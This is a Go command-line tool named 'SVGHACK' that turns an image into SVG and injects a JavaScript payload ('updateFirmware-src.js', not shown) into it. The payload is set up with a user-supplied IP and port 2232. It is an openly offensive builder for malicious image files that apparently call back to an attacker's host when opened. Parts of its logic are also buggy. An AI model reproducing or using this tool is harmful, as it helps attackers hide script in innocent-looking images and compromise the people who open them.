package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/common-nighthawk/go-figure"
)

func createExploit() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("Image path: ")
	imgPath, _ := reader.ReadString('\n')
	imgPath = strings.Replace(imgPath, "\n", "", -1)
	fmt.Println("Output path: ")
	outputPath, _ := reader.ReadString('\n')
	outputPath = strings.Replace(outputPath, "\n", "", -1)
	fmt.Println("IP : ")
	ip, _ := reader.ReadString('\n')
	ip = strings.Replace(ip, "\n", "", -1)
	cmd := exec.Command("png2svg", "-o", outputPath, imgPath)
	unfinishedSVG, gErr := os.ReadFile(outputPath)
	updater, gErr := os.ReadFile("exploits/updateFirmware-src.js")
	svg := string(unfinishedSVG)

	firmware := string(updater)
	firmware = strings.Replace(firmware, "<addr>", ip, -1)
	firmware = strings.Replace(firmware, "<port>", "2232", -1)
	svg = strings.Replace(svg, "</svg>", firmware+"</svg>", -1)
	fmt.Println(svg)
	f, xerr := os.Create(outputPath + "1.svg")
	if xerr != nil {
		panic(xerr)
		return
	}
	l, serr := f.WriteString(svg)
	if serr != nil {
		panic(serr)
		f.Close()
		return
	}
	f.Sync()
	fmt.Println(l, "bytes written successfully")
	//fmt.Println(svg)
	//fmt.Println(svg)
	if gErr != nil {
		panic(gErr)
	}

	err := cmd.Run()
	if err != nil {
		panic(err)
	}

}
func editExploit() {

}

func main() {

	myFigure := figure.NewFigure("SVGHACK", "", true)
	myFigure.Print()
	fmt.Println()
	fmt.Println()
	fmt.Println()
	fmt.Println()
	fmt.Println()
	fmt.Println()
	fmt.Println()
	fmt.Println("(-) Options:")
	fmt.Println("1) Create hack")
	fmt.Println("2) Edit hack")
	fmt.Println("3) Exit")
	fmt.Println("4) install dependancies(requires apt.)")
	fmt.Println("5) deps info")

	reader := bufio.NewReader(os.Stdin)

	text, _ := reader.ReadString('\n')
	text = strings.Replace(text, "\n", "", -1)
	i, err := strconv.Atoi(text)
	if err != nil {
		panic(err)
	} else {

	}
	switch i {
	case 1:
		createExploit()
		break
	case 2:
		break

	case 3:
		os.Exit(0)
		break
	case 4:
		derrg := exec.Command("sh /opt/svghack/installerG.sh")
		derr := derrg.Run()
		if derr != nil {
			panic(derr)
		} else {
			fmt.Println("Successfully install Potrace, and imagemagick!")
		}
		break
	case 5:
		fmt.Println("You will potrace and imagemagick installed.")
	}

}
